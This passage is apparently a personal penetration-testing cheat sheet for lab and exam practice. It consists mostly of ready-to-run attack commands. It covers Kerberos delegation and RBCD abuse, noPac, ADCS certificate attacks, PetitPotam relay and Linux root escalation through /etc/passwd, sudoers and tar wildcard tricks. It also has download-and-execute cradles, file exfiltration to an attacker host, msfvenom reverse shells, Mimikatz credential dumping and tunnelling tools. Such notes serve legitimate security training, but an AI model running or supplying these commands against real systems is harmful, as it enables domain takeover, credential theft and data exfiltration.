impacket-getST -spn SRV/DC01 'INLANEFREIGHT.LOCAL/delegrate-User:pass' -impersonate Administrator -dc-ip 10.129.193.100 
export KRB5CCNAME=./Administrator.ccache

# vim /etc/hosts DC01 (SPN)
impacket-psexec -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01
```

#### RBCD
https://github.com/Kevin-Robertson/Powermad
<br/>
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation

##### PowerShell
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Powermad.ps1')

New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString 'Pass12345!' -AsPlainText -Force) -Verbose 
Get-DomainComputer TEST

$ComputerSid = Get-DomainComputer TEST -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# RBCD User etc GenericWrite
$credentials2 = New-Object System.Management.Automation.PSCredential "resourced\rbcd_user", (ConvertTo-SecureString 'rbcd_pass' -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose -Credential $credentials2

.\Rubeus.exe hash /user:TEST$ /password:'Pass12345!' /domain:resourced.local
.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc01.resourced.local /ptt /nowrap /altservice:host,ldap,http,winrm,cifs

klist
ls \\msdsspn_fqdn\c$
```
##### Bash
```bash
impacket-addcomputer -computer-name 'TEST$' -computer-pass 'Pass12345!' -dc-ip 10.129.205.35 resourced.local/rbcd_user

impacket-rbcd -dc-ip 172.19.99.10 -delegate-from 'TEST$' -delegate-to 'TARGET$' -action 'write' -hashes :bb73d5056f1f2084e5b5bbe18261f6b6 'INLANEFREIGHT.local/TANGUI'
impacket-getST -spn cifs/DC01.resourced.local resourced.local/'TEST$':'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175

# vim /etc/hosts DC01 (SPN)
KRB5CCNAME=./Administrator.ccache impacket-psexec -k -no-pass resourced.local/administrator@DC01.resourced.local
```

#### nopac
```bash
cd /opt/noPac
source ./venv/bin/activate

# scan
python3 scanner.py htb.local/svc_test:testpass -dc-ip 172.16.5.5 -use-ldap

#psexec
python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 -shell --impersonate administrator -use-ldap

# DCSync
python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
```

### ADCS
```bash
# find service
nxc ldap 172.16.117.0/24 -u  -p '' -M adcs
```

https://github.com/secure-77/Certipy-Docker
```powershell
# Cert request
## Certify.exe
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:<CA Name> /template:<Template Name> /altname:Administrator

openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
Cryptographic Provider v1.0" -export -out admin.pfx

##certipy
### docker build -t certipy:latest .
### docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug -stdout
certipy find -dc-ip 10.10.11.69 -u 'ca_svc@fluffy.htb' -hashes aaaaaaaaa -vulnerable -stdout
# ntpdate dc-ip
certipy req -u 'user' -p Password -ca CA_Name -dc-ip DCIP -template TempName -upn
'Administrator@example.com' -debug

## ESC 3
certipy req -u 'own_user' -p 'Password' -ca CA_Name -template User -on-behalf-of 'lab\administrator' -pfx own_user.pfx -dc-ip 10.129.228.236

# TGT request
## Rubeus
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:
## certipy
certipy auth -pfx administrator.pfx -dc-ip <dc-ip> -debug


# ESC 10
certipy account update -u 'user' -p 'Password' -user own_user -upn 'lab-dc$@lab.local' -dc-ip 10.129.228.236
certipy req -u 'own_user' -hashes :ee22ddf0f8a66db4217050e6a948f9d6 -ca CA_Name -template User -dc-ip 10.129.228.236
certipy account update -u 'user' -p 'Password' -user own_user -upn 'user2@lab.local' -dc-ip 10.129.228.236
## ldap_shell for RBCD
certipy auth -pfx lab-dc.pfx -dc-ip 10.129.228.236 -ldap-shell
add_computer plaintext plaintext123
set_rbcd lab-dc$ plaintext$
## RBCD
impacket-getST -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.228.236 lab.local/'plaintext$':plaintext123

# ESC 4
certipy template -u 'user' -p 'Password' -ca CA_Name -template ESC4 -save-old -dc-ip 10.129.228.236
## recover
certipy template -u 'user' -p 'Password' -ca CA_Name -template ESC4 -configuration ESC4.json

# ESC 7
certipy ca -u 'user@lab.local' -p 'Password' -ca CA_Name -enable-template 'SubCA'
certipy ca -u 'user@lab.local' -p 'Password' -ca CA_Name -add-officer ManageCertificates_User
certipy req -u 'user@lab.local' -p 'Password' -ca CA_Name -template SubCA -upn Administrator
certipy ca -u 'user@lab.local' -p 'Password' -ca CA_Name -issue-request 31
certipy req -u 'user@lab.local' -p 'Password' -ca CA_Name -retrieve 31
```
#### PassTheCert
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')

wget https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/PassTheCert.exe

# RBCD
.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --add-computer --computer-name <Computer Name>
Get-DomainComputer authority -Properties distinguishedname
Get-DomainComputer <Computer Name> -Properties objectsid
.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --rbcd --target <CN=DC,OU=Domain Controllers,DC=example,DC=com> --sid <Resource-SID>

impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/DESKTOP-1337$:99U1VOMhRX6LEvISJJQ9PMo07osUJLcp'
impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb

# DCSync
Get-DomainComputer authority -Properties distinguishedname
Get-DomainUser own_uer -Properties objectsid
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --elevate --target DC=AUTHORITY,DC=HTB --sid Own_User_SID
```
#### PetitPotam
https://github.com/topotam/PetitPotam<br/>
https://github.com/ly4k/PetitPotam<br/>

https://github.com/dirkjanm/PKINITtools
```bash
# listener
sudo ntlmrelayx.py -debug -smb2support --target http://target.htb.local/certsrv/certfnsh.asp --adcs --template DomainController
# 強制認証
python3 PetitPotam.py kaliIP targetIP -u user -p password -d domain

# TGT request
.\Rubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /getcredentials /password:
```

### UAC bypass
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC

### Group
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges

### Other Tools
https://github.com/expl0itabl3/Toolies<br/>
https://github.com/dxnboy/redteam<br/>
https://github.com/Flangvik/SharpCollection

## Linux
### SUGGEST
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh 
```
###  /etc/passwd
```bash
joe@debian-privesc:~$ openssl passwd w00t
joe@debian-privesc:~$ openssl passwd -1 w00t
Fdzt.eqJQ4s0g
joe@debian-privesc:~$ echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### shadow
```bash
unshadow ./etc/passwd ./etc/shadow > unshadow.txt
# $y$
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt --rules /usr/share/john/rules/best64.rule unshadow
```

### sudoer
```bash
LFILE='/etc/sudoers'
echo username ALL=(ALL) NOPASSWD: ALL >> c:$LFILE 
```

### Kernel Ecpliot
```bash
# Environment
wget https://github.com/schecthellraiser606/oscp_cheet/raw/main/Dockerfile
docker build -t vuln .
docker run -v /root/work/:/work -it vuln /bin/bash
```

### Cron File backup
```bash
echo 'chmod +s /bin/bash' >root.sh
chmod +x root.sh
touch '/var/www/html/--checkpoint=1'
touch '/var/www/html/--checkpoint-action=exec=bash root.sh'
```

# Transfer
## Port Forwading
### SSH
```bash
# localport
ssh -L 4455:172.16.50.217:445 database_admin@10.4.50.215
# l Dynamic
## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
ssh -D 0.0.0.0:1080 database_admin@10.4.50.215
tail /etc/proxychains4.conf

# remote
sudo systemctl start ssh
ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
# よくあるやつ
ssh -D 0.0.0.0:1080 -R 80:127.0.0.1:80 -R 1336:192.168.45.205:1336 support@192.168.228.153

# r Dynamic
ssh -R 1080 kali@192.168.118.4
tail /etc/proxychains4.conf
```
#### sshuttle
```bash
sshuttle -r database_admin@192.168.50.63:22 10.4.50.0/24 172.16.50.0/24
```
#### plink
```bash
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
### Chisel
https://github.com/jpillora/chisel/releases
```bash
./chisel_1.9.0_linux_amd64 server -p 2345 --reverse
.\chisel.exe client --max-retry-count 2 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445

# Dynamic
./chisel_1.9.0_linux_amd64 server -p 2345 --socks5 --reverse
./chisel_1.9.0_linux_amd64 client --max-retry-count 2 192.168.49.100:2345 R:socks

#Listening fowarding
./chisel_1.9.0_linux_amd64 server -p 2345 
.\chisel.exe client --max-retry-count 2 192.168.45.184:2345 1337:127.0.0.1:80

# tail /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# stop chisel
Stop-Process -Name chisel -Force
```
### Ligolo-ng
https://github.com/nicocha30/ligolo-ng/releases
```bash
# file
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.8.1_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_windows_amd64.zip
unzip ligolo-ng_agent_0.8.1_windows_amd64.zip

sudo ./proxy -selfcert -laddr 0.0.0.0:2345

./agent -connect 192.168.45.10:2345 -ignore-cert
.\agent.exe -connect 192.168.45.10:2345 -ignore-cert

session 
session : 1

interface_create --name ligolo
tunnel_start --tun ligolo
ifconfig 

sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route delete 172.16.0.0/16 dev ligolo
ip route

# Transport Kali Web
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 --tcp
listener_add --addr 0.0.0.0:2345 --to 127.0.0.1:80 --tcp
listener_list

# delete int
sudo ip link set dev ligolo down
sudo ip link delete ligolo
```

## SMB
```bash
impacket-smbserver work ./work -smb2support

copy  \\192.168.\test.zip
xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
```
## FTP
```bash
# get
prompt
mget *

wget -m ftp://ftp:ftp@192.168.166.114/*

# passive mode
passive

# binary mode
bin
# text
ascii

# upload folder
/var/ftp/pub/
```
# HTTP
https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```bash
#powershell
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37/upload -File 

# linux
python3 -c "import requests;requests.post(\"http://10.10.14.68:8000/upload\",files={\"files\":open(\"/home/lnorgaard/RT30000.zip\",\"rb\")})"
curl -X POST http://10.10.14.68:8000/upload -F 'files=@/home/lnorgaard/RT30000.zip'
```


# Tips
## list
```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```

## Metasploit
```bash
# hundler
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
## to base64 
base64 -w0 shell.exe 
# start handler
use multi/handler
## htm c2
use exploit/windows/misc/hta_server
# sessions
sessions -l
sessions -i 1

# exploit suggest
use post/multi/recon/local_exploit_suggester

# privesc 
getsystem
migrate 

load kiwi
creds_all
lsa_dump_sam

# Port Forwading
use multi/manage/autoroute

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
jobs

# other
lcd /home/kali/Downloads
lpwd
download 
upload
```

## Empire
```bash
# first
listeners
uselistener http

usestager windows_launcher_vbs
usestager windows_cmd_exec

agents
interact
```

## RDP admin
```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v: /u:administrator /pth: /dynamic-resolution /drive:.,linux /bpp:8 /compression /audio-mode:0 -themes -wallpaper
```

## User-Name-List
https://github.com/urbanadventurer/username-anarchy
```
git clone https://github.com/urbanadventurer/username-anarchy

./username-anarchy Bill Gates > bill.txt
./username-anarchy --input-file ../full-name.txt > unames.txt
```

## sheet
https://github.com/0xsyr0/OSCP
